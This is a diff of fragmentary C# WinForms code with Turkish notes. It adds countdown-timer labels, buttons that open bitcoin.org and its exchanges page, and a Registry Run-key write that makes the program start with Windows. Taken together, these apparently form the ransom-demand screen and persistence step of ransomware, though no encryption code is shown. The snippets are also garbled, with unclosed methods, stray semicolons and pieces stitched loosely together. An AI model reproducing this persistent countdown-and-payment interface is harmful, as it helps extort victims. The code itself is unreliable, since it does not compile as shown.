@@ -1,0 +1,58 @@
+private void Form1_Load(object sender, EventArgs e)
+
+        {
+            timer2.Start();
+            
+
+            ; timer2.Interval = 1000;
+            timer2.Enabled = true;
+
+            ; timer1.Interval = 1000;
+            timer1.Enabled = true;
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+           
+            label10.Text = DateTime.Now.ToString();
+            label12.Text = DateTime.Now.ToString();
+
+
+
+ private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start("https://bitcoin.org/en/");
+        }
+
+        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start("https://bitcoin.org/en/exchanges");
+        }
+
+        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start("");
+        }
+    }
+
+
+
+timer1.Start(); 
+
+form kısmına yazılır 
+            ; timer1.Interval = 1000;
+            timer1.Enabled = true;
+timer kısmına yazılır
+
+            DateTime dt = DateTime.Now;
+            label10.Text = dt.ToString("MM/dd/yyyy HH:mm:ss");
+            label12.Text = dt.ToString("MM/dd/yyyy HH:mm:ss");
+
+            seconds3--;
+            label11.Text = new DateTime(1970, 01, 01, 00, 00, 00).AddSeconds(seconds3).ToString("dd:HH:mm:ss");
+            seconds7--;
+            label13.Text = new DateTime(1970, 01, 01, 00, 00, 00).AddSeconds(seconds7).ToString("dd:HH:mm:ss");
+
+
+ winows acılınca uygulma calışması
+
+ RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+        key.SetValue("ProgramAdı", "\"" + Application.ExecutablePath + "\"");
